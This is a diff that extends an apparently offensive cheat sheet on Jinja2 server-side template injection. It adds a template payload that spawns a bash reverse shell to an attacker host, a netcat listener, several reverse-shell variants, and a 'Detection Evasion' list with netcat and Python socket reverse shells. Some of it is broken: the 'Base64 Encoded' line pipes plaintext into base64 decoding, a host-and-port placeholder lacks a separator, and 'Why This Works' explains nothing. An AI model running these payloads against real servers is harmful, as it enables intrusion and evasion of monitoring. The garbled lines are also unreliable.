@@ -136,3 +136,34 @@ The list ['ls', '-lah'] contains the command ls and its argument -lah. The comma
 ```
 {{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
 ```
+
+## Jinja2 RCE to Bash Reverse Shell via subprocess.Popen
+
+Reverse Shell Payload
+```
+{{request.application.__globals__.__builtins__.__import__('subprocess').Popen(["bash","-c","bash -i >& /dev/tcp/<attacker-ip><port> 0>&1"])}}
+```
+
+## Listener Setup
+```
+nc -lvnp <port>
+```
+## Why This Works
+```
+subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"]) executes:
+```
+
+### Base64 Encoded:
+```
+args = ["bash", "-c", "echo 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1' | base64 -d | bash"]
+```
+### Multi-stage:
+```
+args = ["bash", "-c", "bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"]
+```
+### Detection Evasion
+
+Netcat	nc -e /bin/bash IP PORT
+```
+Python	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'
+```
